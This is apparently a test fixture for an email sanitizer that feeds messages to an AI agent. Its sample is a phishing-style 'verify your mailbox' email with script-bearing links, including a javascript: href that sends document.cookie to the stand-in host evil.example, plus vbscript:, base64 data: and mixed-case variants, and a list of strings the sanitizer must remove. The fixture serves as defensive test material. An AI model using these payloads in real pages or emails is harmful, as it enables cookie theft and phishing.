/**
 * Adversarial: script-bearing link schemes (javascript:, mixed-case JaVaScRiPt:, vbscript:, data:)
 * and a leading-whitespace variant.
 * Expected: the link text is kept as plain text, the dangerous hrefs never reach the agent,
 * hiddenContentRemoved = false (the visible text is all still there).
 */
import { fixture } from "../fixture.ts";

export default fixture({
  subject: "Action required: verify your mailbox",
  html: `<p>Your mailbox will be suspended. <a href="javascript:location='https://evil.example/'+document.cookie">Verify now</a></p>
<p><a href="JaVaScRiPt:alert(1)">Keep my mailbox</a> | <a href="vbscript:msgbox(1)">Help</a></p>
<p><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Details</a> <a href="  javascript:void(0)">Close</a></p>
<p><a href="https://support.mailhost.example/help">Real support page</a></p>`,
  expect: {
    hidden: false,
    absent: ["javascript:", "vbscript:", "data:text", "document.cookie", "PHNjcmlwdD"],
    present: ["Verify now", "Keep my mailbox", "Help", "Details", "Close"],
    links: [{ text: "Real support page", href: "https://support.mailhost.example/help" }],
  },
});
